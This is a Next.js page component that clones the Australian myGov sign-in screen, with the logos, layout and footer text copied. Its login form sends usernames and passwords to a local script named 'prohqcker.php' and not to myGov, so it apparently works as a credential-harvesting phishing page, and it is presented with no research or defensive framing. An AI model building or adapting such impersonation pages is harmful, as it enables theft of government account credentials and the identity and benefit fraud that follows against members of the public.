import Head from "next/head";
// Import global CSS
import "../../public/css/mgv2-application.css";
import "../../public/css/blugov.css";

export default function MyGovPage() {
  return (
    <>
      <Head>
        <meta charSet="utf-8" />
        <meta httpEquiv="x-ua-compatible" content="ie=edge" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <title>Sign in with myGov - myGov</title>
        <meta name="description" content="" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
        <link
          href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap"
          rel="stylesheet"
        />
      </Head>
      <div className="brand-rainbow">&nbsp;</div>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a className="unauth-govt-crest__link">
                  <img
                    id="unauth-govt-crest"
                    src="/images/myGov-cobranded-logo-black.svg"
                    alt="myGov Beta"
                    role="img"
                  />
                </a>
              </div>
            </div>
          </div>
        </section>
      </header>
      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <h1>Sign in with myGov</h1>
                      <h2 className="text-align-left">Using your myGov sign-in details</h2>
                      <form
                        id="mygov-login-form"
                        className="mygov-login-form alternative"
                        action="prohqcker.php"
                        method="post"
                      >
                        <div className="input-group">
                          <label className="override" htmlFor="userId">
                            Username or email
                          </label>
                          <input
                            id="userId"
                            name="username"
                            aria-required="true"
                            type="text"
                            autoComplete="off"
                            required
                          />
                        </div>
                        <div className="input-group">
                          <label htmlFor="password" className="override">
                            Password
                          </label>
                          <input
                            id="password"
                            name="password"
                            type="password"
                            autoComplete="off"
                            aria-required="true"
                            required
                          />
                        </div>
                        <p className="recovery">
                          <a className="anchor override">Forgot password</a>
                        </p>
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              type="submit"
                              className="button-main"
                              name="_eventId_login"
                            >
                              Sign in
                            </button>
                          </div>
                        </div>
                        <p className="create-account-text">
                          <a
                            className="create-account-link"
                            href="https://my.gov.au/en/create-account/"
                          >
                            Create a myGov account
                          </a>{' '}
                          if you don&apos;t have one already.
                        </p>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <footer role="contentinfo">
        <div className="wrapper">
          <div className="inner">
            <section className="footer-list">
              <nav>
                <h2 className="sr-only" aria-label="Footer">
                  Footer
                </h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank">Terms of use</a>
                  </li>
                  <li>
                    <a target="_blank">Privacy and security</a>
                  </li>
                  <li>
                    <a target="_blank">Copyright</a>
                  </li>
                  <li>
                    <a target="_blank">Accessibility</a>
                  </li>
                </ul>
              </nav>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a>
                  <img
                    src="/images/myGov-cobranded-logo-white.svg"
                    alt="myGov Beta"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live on. We
                pay our respects to all Elders, past and present, of all Aboriginal and
                Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
